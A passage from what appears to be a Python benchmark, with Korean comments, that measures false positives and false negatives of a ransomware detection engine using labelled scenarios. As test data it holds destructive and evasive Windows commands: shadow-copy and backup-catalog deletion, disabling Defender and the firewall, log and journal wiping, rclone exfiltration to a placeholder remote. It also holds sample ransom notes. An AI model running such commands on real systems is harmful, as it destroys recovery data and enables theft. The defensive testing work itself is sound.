# -*- coding: utf-8 -*-
"""
오탐(False Positive) · 미탐(False Negative) 측정 벤치마크 — RansomGuard EDR
============================================================================

목적
----
탐지 엔진이 "랜섬웨어 행위"와 "정상 행위"를 얼마나 정확히 구분하는지를
라벨이 붙은(ground-truth) 행위 시나리오 집합으로 정량 측정한다.  결과는
혼동행렬(Confusion Matrix)과 표준 지표(정확도·정밀도·재현율·오탐률·미탐률·
F1)로 산출되어 발표 자료에 그대로 넣을 수 있다.

무엇을 측정하나 (방법론)
------------------------
각 시나리오는 **실제 탐지기 코드**(mass_io · canary · ransom_note ·
process_cmdline)와 **실제 ScoringEngine**을 그대로 구동해 신호를 만들어낸다.
시뮬레이터처럼 행위만 흉내 내는 게 아니라, 탐지기의 엔트로피/매직바이트/
협박문 내용분석/명령줄 룰을 진짜로 통과시킨다 (실파일을 임시폴더에 쓰고
탐지기 메서드를 직접 호출).

탐지 판정 기준 (제품 정책을 결정론적으로 반영)
  "랜섬웨어로 탐지(경보)" ⇔ 다음 중 하나라도 성립:
    (1) 누적 위협 레벨 ≥ HIGH(경고)            … scoring.THRESHOLD_HIGH
    (2) CRITICAL 심각도 신호가 존재             … 단독으로 고신뢰 (canary 트립,
                                                  VSS 삭제, 협박문 확산 등)
    (3) HIGH 심각도 신호 + 같은 윈도우의 암호화 활동 보강
                                                … responder._is_confident 정책
  → (1)은 대시보드가 🟠경고/🔴위험을 띄우는 조건, (2)(3)은 능동 대응(차단)이
     발동하는 조건과 동일하다 (scoring.py / responder.py:323 참조).

  label=malicious 인데 탐지 못함 → 미탐(FN)
  label=benign     인데 탐지함   → 오탐(FP)

주의: 이 도구는 실제 암호화를 하지 않는다.  랜섬웨어가 만드는 행위 패턴
(고엔트로피 쓰기, 매직바이트 소실, 의심 확장자 변경, VSS 삭제 명령, 협박문)
만 격리된 임시 폴더 안에서 안전하게 재현한다.

실행:  python tests/fp_fn_benchmark.py
출력:  콘솔 표 + reports/fp_fn_metrics.json + .csv + .md
"""

from __future__ import annotations

import csv
import json
import os
import shutil
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional

# 단독 실행 가능하도록 repo root 를 import path 에 추가
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from console import force_utf8
from scoring import (ScoringEngine, Signal, Severity,
                     THRESHOLD_HIGH, ENCRYPTION_SIGNAL_NAMES)
from detectors.mass_io import MassIODetector
from detectors.canary import CanaryDetector
from detectors.ransom_note import RansomNoteDetector
from detectors.process_cmdline import evaluate_cmdline


# ---------------------------------------------------------------------------
# 신뢰 actor 분류기 (actor_trust 게이트의 테스트용 대역).
# 신호 metadata["image"] 가 신뢰 시스템 바이너리면 True.  실제 제품의
# actor_trust 모듈을 결정론적으로 흉내 낸다 — OS 서비싱(TiWorker 등) 정상
# 버스트는 점수에서 제외되고, 그 신뢰 프로세스가 ground-truth 암호화 증거
# (canary 트립 등)를 내면 인젝션/위장으로 보고 *예외 없이* 채점된다.
# ---------------------------------------------------------------------------
TRUSTED_IMAGES = {
    r"c:\windows\winsxs\tiworker.exe",
    r"c:\windows\system32\svchost.exe",
    r"c:\program files\windows defender\msmpeng.exe",
}


def _trust_classifier(sig: Signal) -> bool:
    img = str((sig.metadata or {}).get("image", "")).lower()
    return img in TRUSTED_IMAGES


# ---------------------------------------------------------------------------
# 시나리오 하니스 — 시나리오마다 깨끗한 엔진 + 임시 감시폴더를 준다.
# ---------------------------------------------------------------------------
# 시나리오 작업 폴더는 *반드시* 노이즈 경로(\temp\ \appdata\ \cache\ 등) 밖에
# 둬야 한다.  시스템 %TEMP% 아래(tempfile 기본값)에 만들면 경로에 "\temp\" 가
# 들어가 mass_io._is_noise 가 on_modified(매직바이트 소실·고엔트로피) 신호를
# 통째로 억제해버려서, 엔트로피/매직 분석 경로가 측정되지 않는다.  그래서
# 저장소 루트 아래의 비-노이즈 폴더에 만든다.
_BENCH_ROOT = Path(__file__).resolve().parent.parent / "_fpfn_work"


class Harness:
    """한 시나리오가 사용하는 격리 실행 환경."""

    def __init__(self, use_trust_gate: bool = False):
        self.engine = ScoringEngine(
            is_trusted_actor=_trust_classifier if use_trust_gate else None)
        _BENCH_ROOT.mkdir(parents=True, exist_ok=True)
        self._tmp = Path(tempfile.mkdtemp(prefix="rg_", dir=str(_BENCH_ROOT)))
        self._dirs: List[Path] = []

    # --- 작업 디렉터리 ---
    def watch_dir(self, name: str = "watch") -> Path:
        d = self._tmp / name
        d.mkdir(parents=True, exist_ok=True)
        if d not in self._dirs:
            self._dirs.append(d)
        return d

    def make_file(self, path: Path, data: bytes) -> Path:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return path

    # --- 탐지기 구동 헬퍼 (실제 탐지기 코드 호출) ---
    def mass_io(self, watch: Path) -> MassIODetector:
        return MassIODetector(self.engine, [str(watch)])

    def run_cmdline(self, process_name: str, cmdline: str,
                    pid: Optional[int] = None, ppid: Optional[int] = None) -> None:
        """process_cmdline 룰셋을 실제로 평가해서 나온 신호를 제출."""
        for sig in evaluate_cmdline("process_cmdline", process_name, cmdline,
                                    pid, ppid):
            self.engine.submit(sig)

    def submit(self, sig: Signal) -> None:
        self.engine.submit(sig)

    def cleanup(self) -> None:
        shutil.rmtree(self._tmp, ignore_errors=True)


# ---------------------------------------------------------------------------
# 더미 파일 콘텐츠 (정상 매직바이트로 시작 — 실제 문서/미디어 모방)
# ---------------------------------------------------------------------------
DOCX = b"PK\x03\x04" + b"normal office xml document body " * 120     # ZIP/Office
PDF = b"%PDF-1.7\n" + b"normal pdf stream content text " * 120       # PDF
JPG_HEAD = b"\xff\xd8\xff\xe0"                                        # JPEG magic
PNG_HEAD = b"\x89PNG\r\n\x1a\n"                                       # PNG magic
ZIP_HEAD = b"PK\x03\x04"                                             # ZIP magic
TXT = b"This is an ordinary user note. Nothing suspicious here.\n" * 30


def encrypted_blob(n: int = 4096) -> bytes:
    """고엔트로피(암호화/압축처럼 보이는) 임의 바이트."""
    return os.urandom(n)


# ---------------------------------------------------------------------------
# 시나리오 정의
#   build(h)  : Harness 를 받아 행위를 재현하고 신호를 발생시킨다.
#   label     : "malicious" | "benign"  (ground truth)
# ---------------------------------------------------------------------------
@dataclass
class Scenario:
    key: str
    title_ko: str
    label: str                      # "malicious" | "benign"
    build: Callable[[Harness], None]
    desc_ko: str = ""
    use_trust_gate: bool = False


# ===========================================================================
#  악성(malicious) 시나리오 — 탐지되어야 정상 (미탐 시 FN)
# ===========================================================================

def _encrypt_files(h: Harness, watch: Path, det: MassIODetector,
                   count: int, ext: str = ".docx", base: bytes = DOCX,
                   rename: bool = True) -> None:
    """랜섬웨어식 암호화 패턴을 mass_io 탐지기에 실제로 통과시킨다.
    1) 정상 파일 등록(매직 학습) → 2) 고엔트로피 덮어쓰기(매직 소실) →
    3) .encrypted 로 rename(의심 확장자)."""
    for i in range(count):
        p = h.make_file(watch / f"document_{i:03d}{ext}", base)
        det.on_modified(p)                                  # 매직 학습
        p.write_bytes(encrypted_blob(p.stat().st_size or 4096))
        det.on_modified(p)                                  # 매직 소실 + 고엔트로피
        if rename:
            dst = p.with_suffix(p.suffix + ".encrypted")
            p.rename(dst)
            det.on_moved(p, dst)                            # 의심 확장자
    det._check_burst()                                      # 버스트 판정


def sc_classic_burst(h: Harness) -> None:
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=20)


def sc_canary_trip(h: Harness) -> None:
    """랜섬웨어가 파일 열거 중 canary 디코이를 건드림 — 단일 최고신뢰 신호."""
    w = h.watch_dir()
    canary = CanaryDetector(h.engine, [str(w)])
    deployed = canary.deploy()
    target = deployed[0]
    with open(target, "ab") as f:               # canary 변조
        f.write(b"\x00encrypted")
    # run() 의 해시비교 한 패스를 그대로 재현 → 실제 _raise_alert 호출
    if canary._hash(target) != canary._files[target]:
        canary._raise_alert(target, "canary_modified",
                            f"Canary file modified: {target.name}")


def sc_note_plus_encrypt(h: Harness) -> None:
    """협박문(내용 확인) 살포 + 실제 암호화 활동 동반."""
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=6)          # 암호화 활동
    note = h.make_file(w / "HOW_TO_DECRYPT.txt",
                       (b"All your files have been encrypted.\n"
                        b"Send 0.5 bitcoin to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
                        b"Contact: decryptme@protonmail.com via Tor http://"
                        b"abcdefghij234567.onion\n"))
    rn = RansomNoteDetector(h.engine, [str(w)])
    rn._consider_path(note)


def sc_note_spread(h: Harness) -> None:
    """내용 확인된 협박문이 여러 디렉터리로 확산 (CRITICAL)."""
    rn_dirs = [h.watch_dir(f"docs_{i}") for i in range(4)]
    rn = RansomNoteDetector(h.engine, [str(d) for d in rn_dirs])
    body = (b"Your network has been encrypted.\n"
            b"Pay ransom in Monero to "
            b"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ5AjPYbBR"
            b"r4dwLEDdkR4PVbjFcKfcN4Z2W3sR7ng\n"
            b"Tor: http://abcdefghij234567.onion  do not delete files\n")
    for i, d in enumerate(rn_dirs[:3]):
        note = h.make_file(d / f"!readme_{i}.txt", body)
        rn._consider_path(note)


def sc_vss_then_encrypt(h: Harness) -> None:
    """VSS 그림자 삭제(복구 무력화) + 암호화 — pre-encryption 사보타주."""
    h.run_cmdline("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet",
                  pid=4101, ppid=4100)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=5)


def sc_defender_disable_encrypt(h: Harness) -> None:
    """Defender 무력화 + 제외경로 추가 + 암호화."""
    h.run_cmdline("powershell.exe",
                  "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                  pid=5201, ppid=5200)
    h.run_cmdline("powershell.exe",
                  "Add-MpPreference -ExclusionPath C:\\Users\\victim\\Documents",
                  pid=5202, ppid=5200)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_lotl_cipher(h: Harness) -> None:
    """Living-off-the-land: 내장 cipher /e + BitLocker 강제로 암호화."""
    h.run_cmdline("cipher.exe", "cipher /e /s:C:\\Users\\victim\\Documents",
                  pid=6301, ppid=6300)
    h.run_cmdline("manage-bde.exe", "manage-bde -on C: -used",
                  pid=6302, ppid=6300)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=3)


def sc_obfuscated_chain(h: Harness) -> None:
    """난독 PowerShell 스테이저 + VSS 삭제 + 로그 삭제 체인."""
    h.run_cmdline("powershell.exe",
                  "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQ"
                  "BBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=",
                  pid=7401, ppid=7400)
    h.run_cmdline("wevtutil.exe", "wevtutil cl Security", pid=7402, ppid=7400)
    h.run_cmdline("vssadmin.exe", "vssadmin delete shadows /all", pid=7403, ppid=7400)


def sc_injection_into_trusted(h: Harness) -> None:
    """신뢰 프로세스(svchost) 인젝션 후 암호화 — 신뢰 게이트 사각지대.
    canary 트립은 ground-truth 증거라 '신뢰 actor' 라도 예외 없이 채점된다."""
    w = h.watch_dir()
    canary = CanaryDetector(h.engine, [str(w)])
    deployed = canary.deploy()
    target = deployed[0]
    with open(target, "ab") as f:
        f.write(b"\x00injected-encrypt")
    # svchost 가 낸 canary 트립 (신뢰 이미지로 표시되지만 ground-truth → 채점됨)
    h.submit(Signal(
        detector="canary", name="canary_modified", weight=80,
        severity=Severity.CRITICAL,
        message=f"Canary modified by trusted-looking process: {target.name}",
        metadata={"path": str(target),
                  "image": r"c:\windows\system32\svchost.exe", "pid": 8501},
    ))


def sc_slow_stealth(h: Harness) -> None:
    """저속·소량 암호화 (버스트 임계 미만이지만 매직소실+의심확장자 동반)."""
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=8)          # 버스트(15) 미만


# ===========================================================================
#  정상(benign) 시나리오 — 탐지되면 안 됨 (탐지 시 FP)
# ===========================================================================

def sc_normal_editing(h: Harness) -> None:
    """사용자가 문서를 정상 편집 — 매직바이트 보존, 저엔트로피."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(8):
        p = h.make_file(w / f"report_{i}.docx", DOCX)
        det.on_modified(p)
        p.write_bytes(DOCX + b"edited paragraph appended " * 20)  # 매직 유지
        det.on_modified(p)
    det._check_burst()


def sc_photo_editing(h: Harness) -> None:
    """사진 보정·재저장 — JPEG 는 원래 고엔트로피, 매직 보존."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(12):
        p = h.make_file(w / f"IMG_{i:04d}.jpg", JPG_HEAD + encrypted_blob(3000))
        det.on_modified(p)
        # 재인코딩: 본문은 바뀌지만 JPEG 매직은 유지
        p.write_bytes(JPG_HEAD + encrypted_blob(3200))
        det.on_modified(p)
    det._check_burst()


def sc_video_convert(h: Harness) -> None:
    """동영상 변환 — mp4 는 매직테이블에 없고 native 고엔트로피라 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(10):
        p = h.make_file(w / f"clip_{i}.mp4", encrypted_blob(8000))
        det.on_modified(p)
        p.write_bytes(encrypted_blob(8200))
        det.on_modified(p)
    det._check_burst()


def sc_zip_update(h: Harness) -> None:
    """압축본 갱신 — ZIP 은 native 고엔트로피, 매직 보존."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(10):
        p = h.make_file(w / f"backup_{i}.zip", ZIP_HEAD + encrypted_blob(5000))
        det.on_modified(p)
        p.write_bytes(ZIP_HEAD + encrypted_blob(5200))
        det.on_modified(p)
    det._check_burst()


def sc_browser_cache(h: Harness) -> None:
    """브라우저 캐시 폭주 — 노이즈 경로/확장자라 암호화 신호에서 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    cache = w / "AppData" / "Local" / "Packages" / "msedge" / "Cache"
    for i in range(40):
        p = h.make_file(cache / f"f_{i:06d}", encrypted_blob(4000))
        det.on_modified(p)
        tmp = h.make_file(w / "Temp" / f"chrome_{i}.tmp", encrypted_blob(4000))
        det.on_modified(tmp)
    det._check_burst()


def sc_build_temp(h: Harness) -> None:
    """소프트웨어 빌드 임시파일 — temp 경로/로그 확장자라 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(30):
        p = h.make_file(w / "build" / "Temp" / f"obj_{i}.tmp", encrypted_blob(4000))
        det.on_modified(p)
        lg = h.make_file(w / "build" / "Temp" / f"log_{i}.log", b"build log line\n" * 50)
        det.on_modified(lg)
    det._check_burst()


def sc_single_delete(h: Harness) -> None:
    """앱이 임시파일 1개 삭제 — file_delete 는 암호화 동반 없으면 0점(상관 게이트)."""
    h.submit(Signal(
        detector="process_kernel", name="file_delete", weight=8,
        severity=Severity.LOW,
        message="Single file deleted by app housekeeping",
        metadata={"path": "C:\\Users\\u\\AppData\\app.tmp", "pid": 9100},
    ))


def sc_legit_admin(h: Harness) -> None:
    """관리자의 정상 명령 — 룰에 매칭되지 않아야 함 (list/조회 계열)."""
    h.run_cmdline("vssadmin.exe", "vssadmin list shadows", pid=9201, ppid=9200)
    h.run_cmdline("powershell.exe",
                  "powershell Get-ChildItem C:\\Users -Recurse", pid=9202, ppid=9200)
    h.run_cmdline("cmd.exe", "cmd /c dir C:\\Windows", pid=9203, ppid=9200)


def sc_security_doc(h: Harness) -> None:
    """보안 문서 — 'files are encrypted at rest' 류 문구가 있으나 강지표(지갑/onion)
    없어 협박문으로 confirm 되면 안 됨."""
    w = h.watch_dir()
    doc = h.make_file(
        w / "security_policy.txt",
        b"Company policy: all files are encrypted at rest using AES-256.\n"
        b"To recover data, contact the IT helpdesk and restore from backup.\n"
        b"Decryption keys are managed by the KMS.\n")
    rn = RansomNoteDetector(h.engine, [str(w)])
    rn._consider_path(doc)


def sc_lone_bitlocker(h: Harness) -> None:
    """관리자가 BitLocker 를 켬 — 단일 HIGH 신호이나 암호화 활동/2차 탐지기
    보강이 없어 능동대응 임계 미만이어야 함 (corroboration 게이트)."""
    h.run_cmdline("manage-bde.exe", "manage-bde -on D: -used", pid=9301, ppid=9300)


def sc_os_servicing(h: Harness) -> None:
    """Windows 서비싱(TiWorker) 대량 쓰기 — 신뢰 actor 라 점수 제외."""
    for i in range(20):
        h.submit(Signal(
            detector="minifilter_bridge", name="kernel_write_burst", weight=25,
            severity=Severity.HIGH,
            message="High write volume during update servicing",
            metadata={"image": r"c:\windows\winsxs\tiworker.exe",
                      "pid": 9400, "count": i},
        ))


def sc_archive_password(h: Harness) -> None:
    """사용자가 암호 압축본 생성 — 단일 MEDIUM 힌트(스테이징)는 단독 탐지 안 됨."""
    h.run_cmdline("7z.exe",
                  "7z a -pSecret backup.7z C:\\Users\\u\\Documents", pid=9501, ppid=9500)


# ===========================================================================
#  미탐 한계 탐색용 (정직한 측정) — 알려진 사각지대
# ===========================================================================

def sc_obscure_ext_inplace(h: Harness) -> None:
    """알려지지 않은 확장자 파일을 rename 없이 제자리 암호화.
    사용자모드 콘텐츠 휴리스틱(매직/타깃확장자/협박문/canary)의 사각지대 —
    이런 미탐은 canary·커널 미니필터 계층이 실제 배치에서 보완한다."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(10):
        # 알려진 매직도 없고, 타깃 확장자도 아니며, rename/협박문/canary 없음
        p = h.make_file(w / f"data_{i}.xyz", b"opaque-binary-blob-header")
        det.on_modified(p)
        p.write_bytes(encrypted_blob(4096))
        det.on_modified(p)
    det._check_burst()


# ===========================================================================
#  추가 악성(malicious) 시나리오 — 표본 확대 (탐지되어야 정상)
# ===========================================================================

def sc_inplace_known_ext(h: Harness) -> None:
    """알려진 확장자(.docx)를 rename 없이 제자리 암호화.
    매직바이트 소실(known→unknown) + 고엔트로피로 잡힌다 — obscure_inplace
    (미지 매직) 와 달리 '알려진 형식의 제자리 암호화'는 탐지된다."""
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=12, rename=False)


def sc_ext_lockbit(h: Harness) -> None:
    """LockBit 계열 확장자(.lockbit)로 변경하는 대량 암호화 (확장자 변종)."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(18):
        p = h.make_file(w / f"file_{i:03d}.xlsx", DOCX)
        det.on_modified(p)
        p.write_bytes(encrypted_blob(p.stat().st_size or 4096))
        det.on_modified(p)
        dst = p.with_suffix(p.suffix + ".lockbit")
        p.rename(dst)
        det.on_moved(p, dst)
    det._check_burst()


def sc_bcdedit_recovery(h: Harness) -> None:
    """BCD 복구 비활성화(복구 무력화) + 암호화."""
    h.run_cmdline("bcdedit.exe",
                  "bcdedit /set {default} recoveryenabled no", pid=4201, ppid=4200)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_wbadmin_catalog(h: Harness) -> None:
    """Windows 백업 카탈로그 삭제(복구 무력화) + 암호화."""
    h.run_cmdline("wbadmin.exe", "wbadmin delete catalog -quiet",
                  pid=4301, ppid=4300)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_usn_journal_wipe(h: Harness) -> None:
    """USN 변경 저널 삭제(포렌식 회피) + 암호화."""
    h.run_cmdline("fsutil.exe", "fsutil usn deletejournal /d C:",
                  pid=4401, ppid=4400)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_byovd_kernel(h: Harness) -> None:
    """BYOVD: 취약 커널 드라이버 서비스 생성 + 암호화."""
    h.run_cmdline("sc.exe",
                  "sc create vulndrv type= kernel binPath= C:\\temp\\vuln.sys",
                  pid=4501, ppid=4500)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_double_extortion(h: Harness) -> None:
    """이중 갈취: rclone 유출 + 암호 압축 스테이징 + 암호화."""
    h.run_cmdline("rclone.exe",
                  "rclone copy C:\\Users\\victim\\Documents remote:exfil",
                  pid=4601, ppid=4600)
    h.run_cmdline("7z.exe",
                  "7z a -pInfected stage.7z C:\\Users\\victim\\Documents",
                  pid=4602, ppid=4600)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=8)


def sc_wmic_shadow_delete(h: Harness) -> None:
    """WMIC 로 그림자 복사본 삭제 — 단독 CRITICAL."""
    h.run_cmdline("wmic.exe", "wmic shadowcopy delete /nointeractive",
                  pid=4701, ppid=4700)


def sc_ps_remove_shadow(h: Harness) -> None:
    """PowerShell WMI 로 그림자 복사본 삭제 — 단독 CRITICAL."""
    h.run_cmdline("powershell.exe",
                  "Get-WmiObject Win32_ShadowCopy | Remove-WmiObject",
                  pid=4801, ppid=4800)


def sc_firewall_off_encrypt(h: Harness) -> None:
    """방화벽 차단(C2/전파 준비) + 암호화."""
    h.run_cmdline("netsh.exe",
                  "netsh advfirewall set allprofiles state off",
                  pid=4901, ppid=4900)
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=4)


def sc_canary_plus_burst(h: Harness) -> None:
    """카나리 트립으로 부스트가 열린 뒤 대량 암호화 — 교차신호 부스트 경로."""
    w = h.watch_dir()
    canary = CanaryDetector(h.engine, [str(w)])
    deployed = canary.deploy()
    target = deployed[0]
    with open(target, "ab") as f:
        f.write(b"\x00encrypted")
    if canary._hash(target) != canary._files[target]:
        canary._raise_alert(target, "canary_modified",
                            f"Canary file modified: {target.name}")
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=6)


def sc_note_random_name(h: Harness) -> None:
    """무작위 이름 협박문(7f3a91.txt) — 이름 패턴은 안 맞지만 내용(지갑/onion)
    으로 탐지 + 암호화 동반."""
    w = h.watch_dir()
    det = h.mass_io(w)
    _encrypt_files(h, w, det, count=5)
    note = h.make_file(w / "7f3a91.txt",
                       (b"All your files have been encrypted.\n"
                        b"Pay 0.3 BTC to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n"
                        b"Tor: http://abcdefghij234567.onion  email: lock@tutanota.com\n"))
    rn = RansomNoteDetector(h.engine, [str(w)])
    rn._consider_path(note)


# ===========================================================================
#  추가 정상(benign) 시나리오 — 표본 확대 (탐지되면 안 됨)
# ===========================================================================

def sc_log_rotation(h: Harness) -> None:
    """애플리케이션 로그 로테이션 — .log 는 노이즈 확장자라 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(40):
        p = h.make_file(w / "logs" / f"app_{i}.log", b"INFO request handled ok\n" * 40)
        det.on_modified(p)
    det._check_burst()


def sc_git_objects(h: Harness) -> None:
    """Git 작업 — .git/objects 의 zlib 압축 객체(확장자 없음, 타깃 아님)."""
    w = h.watch_dir()
    det = h.mass_io(w)
    objs = w / "repo" / ".git" / "objects" / "ab"
    for i in range(30):
        p = h.make_file(objs / f"{i:038d}", b"\x78\x9c" + encrypted_blob(2000))
        det.on_modified(p)
    det._check_burst()


def sc_vmdk_write(h: Harness) -> None:
    """VM 디스크 이미지 쓰기 — .vmdk 는 타깃 확장자가 아니라 엔트로피 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(12):
        p = h.make_file(w / f"disk_{i}.vmdk", encrypted_blob(9000))
        det.on_modified(p)
        p.write_bytes(encrypted_blob(9200))
        det.on_modified(p)
    det._check_burst()


def sc_installer_download(h: Harness) -> None:
    """설치 파일 다운로드 — PE(MZ) 매직 보존, .exe 는 타깃 아님."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(10):
        p = h.make_file(w / f"setup_{i}.exe", b"MZ" + encrypted_blob(6000))
        det.on_modified(p)
    det._check_burst()


def sc_music_library(h: Harness) -> None:
    """음악 라이브러리 태그 갱신 — .mp3 는 native 고엔트로피라 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(15):
        p = h.make_file(w / f"track_{i:02d}.mp3", encrypted_blob(7000))
        det.on_modified(p)
        p.write_bytes(encrypted_blob(7100))     # 재태깅
        det.on_modified(p)
    det._check_burst()


def sc_cad_save(h: Harness) -> None:
    """CAD 도면 저장 — .dwg 는 타깃이나 정상 도면은 저엔트로피(매직 소실 없음)."""
    w = h.watch_dir()
    det = h.mass_io(w)
    body = b"AC1027 DWG drawing entities section " * 200       # 저엔트로피
    for i in range(8):
        p = h.make_file(w / f"plan_{i}.dwg", body)
        det.on_modified(p)
        p.write_bytes(body + b"more entities ")
        det.on_modified(p)
    det._check_burst()


def sc_legit_archive_nopw(h: Harness) -> None:
    """정상 압축 백업(비밀번호 없음) — archive_password_staging 룰은 -p 필요."""
    h.run_cmdline("7z.exe",
                  "7z a backup.7z C:\\Users\\u\\Documents", pid=9601, ppid=9600)


def sc_vss_resize_legit(h: Harness) -> None:
    """관리자가 VSS 저장공간을 *늘림* — 단일 HIGH 룰이나 암호화 보강 없어 임계 미만."""
    h.run_cmdline("vssadmin.exe",
                  "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=20GB",
                  pid=9701, ppid=9700)


def sc_backup_software(h: Harness) -> None:
    """백업 소프트웨어가 .vbk 생성 — 타깃 확장자가 아니라 엔트로피 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(10):
        p = h.make_file(w / f"backup_{i}.vbk", encrypted_blob(8000))
        det.on_modified(p)
    det._check_burst()


def sc_cloud_sync(h: Harness) -> None:
    """클라우드 동기화로 문서 내려받기 — Office(PK) 매직 보존, 저엔트로피."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(25):
        p = h.make_file(w / "OneDrive" / f"doc_{i:03d}.docx", DOCX)
        det.on_modified(p)
    det._check_burst()


def sc_iso_download(h: Harness) -> None:
    """OS ISO 다운로드 — .iso 는 타깃 확장자가 아님."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(6):
        p = h.make_file(w / f"image_{i}.iso", encrypted_blob(9000))
        det.on_modified(p)
        p.write_bytes(encrypted_blob(9100))
        det.on_modified(p)
    det._check_burst()


def sc_db_backup(h: Harness) -> None:
    """DB 백업 파일(.bak) 생성 — 타깃 확장자가 아니라 엔트로피 제외."""
    w = h.watch_dir()
    det = h.mass_io(w)
    for i in range(8):
        p = h.make_file(w / f"db_{i}.bak", encrypted_blob(8000))
        det.on_modified(p)
    det._check_burst()


SCENARIOS: List[Scenario] = [
    # ---- 악성 (탐지 기대) ----
    Scenario("classic_burst", "고전적 대량 암호화 버스트", "malicious",
             sc_classic_burst, "20개 문서 고엔트로피+매직소실+.encrypted 변경"),
    Scenario("canary_trip", "Canary 디코이 변조", "malicious",
             sc_canary_trip, "랜섬웨어가 미끼 파일을 건드림 (단일 최고신뢰)"),
    Scenario("note_plus_encrypt", "협박문 + 암호화 동반", "malicious",
             sc_note_plus_encrypt, "내용확인 협박문 + 실제 암호화 활동"),
    Scenario("note_spread", "협박문 다중 디렉터리 확산", "malicious",
             sc_note_spread, "지갑/onion 포함 협박문 3개 폴더 확산"),
    Scenario("vss_then_encrypt", "VSS 삭제 후 암호화", "malicious",
             sc_vss_then_encrypt, "그림자 복사본 삭제(복구 무력화)+암호화"),
    Scenario("defender_disable", "Defender 무력화 + 암호화", "malicious",
             sc_defender_disable_encrypt, "실시간보호 끄기+제외경로+암호화"),
    Scenario("lotl_cipher", "내장도구 악용(cipher/BitLocker)", "malicious",
             sc_lotl_cipher, "cipher /e + manage-bde -on 으로 암호화"),
    Scenario("obfuscated_chain", "난독 PowerShell 파괴 체인", "malicious",
             sc_obfuscated_chain, "인코딩 PS + 이벤트로그삭제 + VSS삭제"),
    Scenario("injection_trusted", "신뢰 프로세스 인젝션 암호화", "malicious",
             sc_injection_into_trusted,
             "svchost 위장 canary 트립 (신뢰게이트 사각지대 차단)",
             use_trust_gate=True),
    Scenario("slow_stealth", "저속·소량 암호화", "malicious",
             sc_slow_stealth, "버스트 임계 미만이나 매직소실+의심확장자"),
    Scenario("inplace_known_ext", "제자리 암호화(알려진 확장자)", "malicious",
             sc_inplace_known_ext, "rename 없이 docx 제자리 암호화 (매직소실+버스트)"),
    Scenario("ext_lockbit", "LockBit 확장자 변종", "malicious",
             sc_ext_lockbit, ".lockbit 확장자로 대량 변경"),
    Scenario("bcdedit_recovery", "BCD 복구 비활성화 + 암호화", "malicious",
             sc_bcdedit_recovery, "recoveryenabled no + 암호화"),
    Scenario("wbadmin_catalog", "백업 카탈로그 삭제 + 암호화", "malicious",
             sc_wbadmin_catalog, "wbadmin delete catalog + 암호화"),
    Scenario("usn_journal_wipe", "USN 저널 삭제 + 암호화", "malicious",
             sc_usn_journal_wipe, "fsutil usn deletejournal + 암호화"),
    Scenario("byovd_kernel", "BYOVD 드라이버 로드 + 암호화", "malicious",
             sc_byovd_kernel, "sc create type=kernel + 암호화"),
    Scenario("double_extortion", "이중 갈취(유출+암호화)", "malicious",
             sc_double_extortion, "rclone 유출 + 7z 스테이징 + 암호화"),
    Scenario("wmic_shadow_delete", "WMIC 그림자 삭제", "malicious",
             sc_wmic_shadow_delete, "wmic shadowcopy delete (단독 CRITICAL)"),
    Scenario("ps_remove_shadow", "PowerShell 그림자 삭제", "malicious",
             sc_ps_remove_shadow, "Win32_ShadowCopy Delete (단독 CRITICAL)"),
    Scenario("firewall_off_encrypt", "방화벽 차단 + 암호화", "malicious",
             sc_firewall_off_encrypt, "advfirewall off + 암호화"),
    Scenario("canary_plus_burst", "카나리 + 부스트 버스트", "malicious",
             sc_canary_plus_burst, "canary 트립 후 부스트된 대량 암호화"),
    Scenario("note_random_name", "무작위 이름 협박문", "malicious",
             sc_note_random_name, "이름패턴 불일치이나 내용(지갑/onion)으로 탐지 + 암호화"),

    # ---- 정상 (미탐지 기대) ----
